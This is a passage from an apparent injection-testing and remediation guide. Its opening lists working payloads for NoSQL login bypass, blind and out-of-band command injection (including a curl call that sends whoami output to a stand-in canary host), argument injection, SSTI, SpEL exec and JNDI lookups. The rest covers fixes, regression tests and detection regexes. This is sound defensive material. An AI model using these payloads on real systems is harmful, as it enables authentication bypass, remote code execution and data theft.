   `curl -s -X POST TARGET/login -H 'Content-Type: application/json' -d '{"email":{"$gt":""},"password":{"$ne":"zzz"}}'` → 200/session cookie where credentials were required = bypass. Extraction oracle: `{"password":{"$regex":"^a"}}` cycling characters, watching 200/401 flips per guess.
7. **NoSQL — server-side JS via $where (lab).**
   Filter accepting user text into `$where`: submit `{"$where":"var d=Date.now()+5000;while(Date.now()<d){};true"}` → ~5s response delay confirms JS execution inside mongod.
8. **Command injection — blind time-based.**
   Filename field: `report.tar.gz; sleep 5`, backticks `` report`sleep 5`.gz ``, substitution `report$(sleep 5).gz`, newline-encoded `report%0asleep%205`.
   `curl -s -o /dev/null -w '%{time_total}\n' -F "file=report.tar.gz;sleep 5" TARGET/upload` → ~5s delay with no egress required.
9. **Command injection — OOB confirmation (egress available).**
   Payload `x; curl http://CANARD.oob.example/$(whoami)` → canary DNS/HTTP hit containing `whoami` output confirms execution and exfil channel.
10. **Argument injection (no shell).**
    User data reaching argv of a privileged wrapper: submit `--checkpoint=1 --checkpoint-action=exec=/bin/id` to a tar wrapper, or `-oProxyCommand=curl CANARD.oob.example` into an ssh wrapper → canary callback / observed process = critical confirmation.
11. **SSTI — detect then escalate (lab only).**
    Submit `{{7*7}}` (and engine variants from the SSTI table) into rendered fields → arithmetic result (`49`, `7777777`) rendered proves template evaluation; escalate with that engine's escape row only on isolated instances. Expected observable: computed value appears in page body where text was expected.
12. **SpEL / OGNL / EL (lab).**
    Endpoint persisting or echoing evaluated expressions: submit `T(java.lang.Thread).sleep(5000)` (SpEL timing oracle) then `T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwn')`; OGNL `%{@java.lang.Thread@sleep(5000)}`. Expected: delay, then `/tmp/pwn` exists / process visible.
13. **JNDI (Log4shell-style, lab).**
    `curl -si TARGET/ -H 'X-Api-Version: ${jndi:ldap://CANARD.oob.example/x}'` (repeat for User-Agent and form fields; try `${${lower:j}ndi:...}` obfuscation) → canary LDAP/DNS hit confirms lookup resolution.
14. **CRLF — response splitting probe.**
    `curl -si "TARGET/redirect?url=%0d%0aSet-Cookie:%20injected=1"` → response carries `Set-Cookie: injected=1` header = header injection. Also test literal `\r\n`, bare `%0a`, and repeat through the gateway hostname (intermediaries differ from app behavior).
15. **Log injection probe (staging).**
    Submit User-Agent `probe\nFAKE-ERROR auth-failure user=admin` → pull logs; a forged line boundary confirms CWE-117 exposure.
16. **LDAP / XPath (lab).**
    Directory login: user value `*` (wildcard match → login succeeds for first entry) or `admin)(&` (filter parse failure → distinct error) confirms injection. XPath login: password `' or '1'='1` against predicate `[name='U' and pw='P']` returns all users → bypass.

### Confirming statically when no runtime exists

1. Import the project's query/command builder into a harness; mock the driver/connection to capture the final artifact (monkeypatch `cursor.execute` to record SQL; stub `child_process`).
2. Push a payload corpus through it: `'`, `"`, `; -- `, `{{7*7}}`, `${jndi:ldap://x/a}`, `{"$ne":1}`, `$(id)`, `--checkpoint-action=exec=id`, `%0d%0aX: y`.
3. Assert whether payload bytes survive unescaped into the captured statement/argv/header block — survival equals constructability proven.
4. For query builders, execute the constructed statement against a throwaway in-process SQLite DB: a quote-induced syntax error proves your character crossed from data into SQL grammar.
5. Attach the recorded chain (source→sink file:line plus captured artifact) to the finding as the substitute for dynamic observation.

## Remediation

### Class 1 — SQL: parameterize values, allowlist identifiers

Node + Express (mysql2):

```js
// VULNERABLE
const sql = `SELECT * FROM users WHERE name = '${req.query.name}' ORDER BY ${req.query.sort}`;
db.query(sql);
// FIXED
const SORTS = { name: "last_name", created: "created_at" };                                  // FIXED
const col = SORTS[String(req.query.sort)];                                                   // FIXED
if (!col) return res.status(400).json({ error: "bad sort" });                                // FIXED
db.query("SELECT * FROM users WHERE name = ? ORDER BY " + col, [String(req.query.name)]);    // FIXED
```

Python + Django:

```python
# VULNERABLE
cur.execute(f"SELECT id, title FROM app_note WHERE owner = '{owner}'")
notes = Note.objects.extra(where=["title LIKE '%%%s%%'" % q])
# FIXED
cur.execute("SELECT id, title FROM app_note WHERE owner = %s", [owner])   # FIXED
notes = Note.objects.filter(title__icontains=q)                           # FIXED
Note.objects.raw("SELECT * FROM app_note WHERE owner = %s", [owner])      # FIXED if raw unavoidable
```

Java + Spring:

```java
// VULNERABLE
List<User> out = jdbc.query("SELECT * FROM users WHERE last = '" + last + "'", MAPPER);
Page<User> p = repo.findAll(PageRequest.of(page, size, Sort.by(request.getParameter("sort"))));
// FIXED
List<User> out = jdbc.query("SELECT * FROM users WHERE last = ?", MAPPER, last);     // FIXED
Sort s = ALLOWED.containsKey(sort) ? Sort.by(ALLOWED.get(sort)) : Sort.unsorted();   // FIXED
Page<User> p = repo.findAll(PageRequest.of(page, size, s));                          // FIXED
```

PHP (PDO + Laravel):

```php
// VULNERABLE
$rows = $pdo->query("SELECT * FROM users WHERE name = '" . $_GET['name'] . "'");
User::orderByRaw($request->input('sort'))->get();
// FIXED
$st = $pdo->prepare("SELECT * FROM users WHERE name = :name");        // FIXED
$st->execute([":name" => (string)$_GET["name"]]);                     // FIXED
$map = ["name" => "name", "date" => "created_at"];                    // FIXED
User::orderBy($map[$request->input("sort")] ?? "name")->get();        // FIXED
```

### Class 2 — OS command: argv arrays, no shell, guarded arguments

```js
// Node — VULNERABLE
exec(`convert ${userPath} out.png`);
// FIXED
execFile("convert", [path.basename(userPath), "out.png"], { timeout: 10000 }, cb);  // FIXED
```

```python
# Python — VULNERABLE
subprocess.run(f"tar czf {dst} {src}", shell=True)
# FIXED
subprocess.run(["tar", "czf", dst, "--", src], shell=False, check=True, timeout=60)  # FIXED
```

```java
// Java — VULNERABLE
Runtime.getRuntime().exec("tar czf " + dst + " " + src);
// FIXED: ProcessBuilder + reject '-'-leading user tokens when operand expected
new ProcessBuilder(List.of("tar", "czf", dst, "--", src)).start();                   // FIXED
```

```php
// PHP — VULNERABLE
system("tar czf {$dst} {$src}");
// FIXED: argv array without shell; every operand validated/escaped appropriately
$cmd = ["tar", "czf", $dst, "--", basename($src)];                                   // FIXED
proc_open($cmd, $desc, $pipes);                                                      // FIXED
```

Wrapper guards: pin `git -c protocol.ext.allow=never`; never let user data become an ssh/curl/rsync option; run converters under a dedicated unprivileged OS account with no sudo rights; set `PAGER=cat`.

### Class 3 — NoSQL: coerce types at the boundary

```js
// VULNERABLE
User.findOne({ email: req.body.email });
// FIXED
const email = String(req.body.email ?? "");                                          // FIXED
User.findOne({ email }, null, { sanitizeFilter: true });                             // FIXED
```

Ban `$where`/`$function` in application code; Redis Lua receives user data only via `ARGV`/`KEYS`, never string-built scripts; CouchDB selectors validated against a fixed field allowlist before `_find`.

### Class 4 — Templates: data, never code

- Render user text as a variable: `render_template("hi.html", name=q)`; delete `render_template_string(q)` paths.
- Reject user-controlled template names (Thymeleaf view names, FreeMarker loader paths) via fixed enums.
- Editable templates as a product requirement: Jinja2 `SandboxedEnvironment`, FreeMarker restricted object wrappers with `?new` banned, Twig sandbox whitelists, Smarty `$security_policy` enabled — and re-threat-model escapes each release.
- Replace user-owned Python `.format` strings with concatenation or `string.Template` (no attribute access).

### Class 5 — eval / EL / JNDI

- Delete eval-family sinks; replace with dispatch tables/maps.
- SpEL: `SimpleEvaluationContext` (blocks `T()` type refs and beans) or remove the parser entirely; upgrade Struts; upgrade Log4j >=2.17.1 with message lookups disabled.
- `InitialContext.lookup` only with hardcoded/allowlisted URLs.

### Class 6 — LDAP / XPath

- Escape filter input per RFC 4515 (`* ( ) \` NUL); prefer library helpers such as PHP `ldap_escape(..., LDAP_ESCAPE_FILTER)`.
- XPath: compile expressions with variables (`$name`) bound via resolver (Java `XPath`, lxml kwargs support this); never string-assemble predicates.

### Class 7 — Headers / logs

- Reject CR/LF (and decoded `%0d`/`%0a`) in any header-bound or redirect-target value; use framework redirect APIs plus scheme/host allowlists.
- Structured JSON logging encoders; strip control characters from logged fields; never interpolate raw input into log format strings.

### Defense-in-depth

- Least-privilege DB accounts per service: no FILE/SUPERUSER (MySQL), no superuser/COPY PROGRAM (Postgres), xp_cmdshell disabled (MSSQL); separate read-only role for reporting paths.
- Disable multi-statement execution where drivers permit (mysqli without MULTI_STATEMENTS flag; PDO `EMULATE_PREPARES=false`).
- Closed allowlist maps for every identifier splice; never trust raw convenience APIs with request data.
- Central boundary validation (zod/joi/express-validator/DataAnnotations/symfony validator) with scalar-type coercion — eliminates NoSQL type confusion wholesale.
- WAFs are detective controls: assume bypass by double encoding, JSON unicode, HPP, dialect quirks; never accept a WAF as the fix.
- Verbose DB errors off in production; generic error pages; alert on `SLEEP`/`WAITFOR`/`pg_sleep` patterns and anomalous latencies.
- Rate-limit and lock down authentication surfaces targeted by blind-injection oracles.
## Verification & Validation

GIVEN/WHEN/THEN cases (staging/lab):

| Given | When | Then |
|---|---|---|
| `/search?q=` fixed with bound params | `q=x' AND SLEEP(5)-- -` | latency ≈ baseline (<0.3s delta), no 500 |
| Same endpoint | `q=o'brien` (legit apostrophe) | row "O'Brien" returned, no error (negative test) |
| `/items?sort=` fixed with allowlist | `sort=name;DROP TABLE items--` | 400 or fallback column; items table intact |
| Login fixed with coercion + `sanitizeFilter` | body `{"email":{"$gt":""},"password":{"$ne":1}}` | 401; zero sessions issued |
| Export switched to `execFile` argv | filename `report;id` | no `uid=` output anywhere; clean exit code |
| Legit filename `my report 2026.pdf` | passes converter | converts successfully (usability retained) |
| Renderer switched to data binding | input `{{7*7}}` | literal text displayed; never `49` |
| Redirect fixed with CR/LF rejection | `url=%0d%0aSet-Cookie:%20inj=1` | no injected header in response |
| Structured log pipeline | UA containing `\n` | single JSON event; no forged line |
| LDAP filter RFC4515-escaped | user `*` then `admin)(&` | literal uid lookup; no wildcard match, no parse error |
| XPath variable binding deployed | password `' or '1'='1` | authentication still requires real match |

Regression-test pseudocode:

```python
PAYLOADS = ["x'", "x' AND '1'='2", "{{7*7}}", "${jndi:ldap://x/a}", '{"$ne":1}',
            "; sleep 5", "$(id)", "--checkpoint-action=exec=id", "%0d%0aX: y",
            "*)(&", "' or '1'='1"]

@pytest.mark.parametrize("p", PAYLOADS)
def test_injection_regression(p):
    r = client.post("/api/search", json={"q": p, "sort": p, "file": p})
    assert r.status_code != 500
    assert elapsed(r) < 1.0                        # no time-based channel
    assert extracted_template_result(r) != "49"    # SSTI inertness
    assert table_intact("items")                   # no stacked-query damage

def test_legit_still_works():
    r = client.post("/api/search", json={"q": "o'brien", "sort": "date", "file": "my report.pdf"})
    assert r.status_code == 200 and r.json()["hits"] >= 1
```

Manual re-test checklist:

1. Re-trace every reported source→sink chain; confirm the neutralizer sits between the last propagator and the sink.
2. Confirm allowlist maps are closed (unknown key → default/reject), not open dictionaries.
3. Confirm fixes cover ALL sibling call sites of each patched sink (grep the function name repo-wide).
4. Confirm the patch introduced no new raw/eval/shell API.
5. Re-run timing probes (3x) on former time-based channels.
6. Verify negative tests (legit special characters) pass — over-strict fixes mangling data are findings too.
7. Verify claimed dependency upgrades (Log4j >=2.17.1, Twig, Struts) actually appear in lockfiles/manifests.

Re-run these signatures post-fix (expect hits only inside closed allowlist maps):

```regex
(?i)\.(raw|literal|whereRaw|orderByRaw|query)\s*\(\s*[`"'][^`"'"]*(\$\{|\+)
(?i)(execute|query|exec)\s*\(\s*(f["']|[^)]*"\s*\+)
(?i)(render_template_string|from_string|ERB\.new|\beval\s*\(|new Function\s*\(|shell\s*=\s*True|shell:\s*true|execSync|os\.system)
(\\r\\n|%0d%0a)|(\$where|\$function)
```

## Severity Assessment

| Finding class | Primary CWE(s) | Typical impact | Base band |
|---|---|---|---|
| Pre-auth SQLi (union/error/blind) on business DB | CWE-89 | full read/write, auth bypass, DB-feature RCE | Critical |
| Post-auth SQLi on sensitive store | CWE-89 | PII exfiltration | High |
| Hibernate/HQL-specific variant | CWE-564 | as SQLi | High |
| OS command injection (any auth level) | CWE-78 (CWE-77 generic) | server takeover | Critical/High |
| Argument injection into privileged wrapper | CWE-78 | privilege escalation | Critical if root wrapper, else High |
| SSTI with escape path | CWE-1336 | RCE | Critical |
| SSTI sandboxed / info-only (Liquid, Django attr leak) | CWE-1336 | disclosure/DoS | Low-Medium |
| eval/new Function/EL/SpEL/OGNL fed input | CWE-94/95/917 | RCE | Critical |
| JNDI lookup trigger (legacy Log4j) | CWE-917 | RCE via rogue LDAP server | Critical |
| NoSQL operator injection | CWE-943 | auth bypass, enumeration | High |
| LDAP injection | CWE-90 | auth bypass, directory enumeration | High |
| XPath injection | CWE-643 | auth bypass, XML data theft | High |
| Generic interpreter injection catch-all | CWE-74 | varies — remap to specific class above | per class |
| CRLF/response splitting | CWE-74 (+79 delivery) | session fixation, cache poisoning | Medium |
| Log content injection | CWE-117 | forged/obscured audit trail | Low |

Example CVSS v3.1 vectors (adjust metrics per engagement):

- Critical — pre-auth time-based SQLi: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8)
- High — authenticated admin-only command injection: `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` (7.2)
- Medium — reflected CRLF header injection: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` (~5.4)
- Low — log-content injection only: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N` (3.7)

Mini-rubric:

| Factor | Pushes Critical/High | Pushes Low |
|---|---|---|
| Authentication | none or self-registration | admin-only wrapper, internal tool |
| Effect channel | data read/write, RCE, auth bypass | delay-only blind oracle, cosmetic log noise |
| Sink process privilege | root/DBA/service account | unprivileged user, sandboxed engine |
| Reach | internet-facing | internal behind VPN |
| Data sensitivity | PII/PHI/credentials/secrets | synthetic or public data |
| Compensating controls | none or WAF-only | egress filtering + sandbox + least privilege (lowers severity; still fix) |

## Common False Positives

- Value originates from a server-side enum/constant or migration-defined map, not request data — no taint.
- Placeholder already present (`?`, `:name`, `$1`, `@p`) and values flow through the driver's binding mechanism; the concat you saw was over the bindings array.
- Identifier resolved through a closed allowlist dict before splicing into SQL — safe by construction once closure is verified (missing-key default).
- Numeric contexts hardened by bounded strict casts (`int(x)` with range check, `Number.isInteger(parseInt(x))`) — downgrade rather than dismiss only when bounds are absent.
- Raw ORM calls WITH bound params: `raw(sql, params=[x])`, `find_by_sql([sql, x])`, Prisma `$queryRaw` tagged template — safe forms of scary-looking APIs.
- `escapeshellarg`-wrapped operands executed without a shell via array-form `proc_open`/`ProcessBuilder` — adequate defense (still flag cmd.exe contexts).
- LIKE input passing through a real wildcard escaper plus declared `ESCAPE` clause.
- Mongo filters built from zod/joi-coerced scalars or with `sanitizeFilter:true` active.
- Template receives user text as an autoescaped data variable — not SSTI.
- Test fixtures, seed scripts, and operator-run CLI tools where argv comes from a documented trust boundary — note in report; flag only if that boundary is undocumented.
- WAF/vendor scanner alerts with no corresponding sink in source — verify against code before reporting; WAF hits alone are not findings.
- HTML-entity encoding applied to values already bound as SQL parameters at display time — noisy but harmless; cleanup note only.

## References

CWE entries:

- CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
- CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')
- CWE-117: Improper Output Neutralization for Logs
- CWE-564: SQL Injection: Hibernate
- CWE-643: Improper Neutralization of Special Elements in XQuery Expressions (XPath injection practice maps here)
- CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic
- CWE-1336: Improper Neutralization of Special Elements Used for Template Command Construction

OWASP Cheat Sheet Series:

- OWASP Top 10 A03:2021 – Injection — https://owasp.org/Top10/A03_2021-Injection/
- SQL Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- Query Parameterization Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
- Database Security Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html
- Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
- Injection Prevention Cheat Sheet in Java — https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet_in_Java.html
- OS Command Injection Defense Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- Server Side Template Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html
- LDAP Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
- Logging Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html



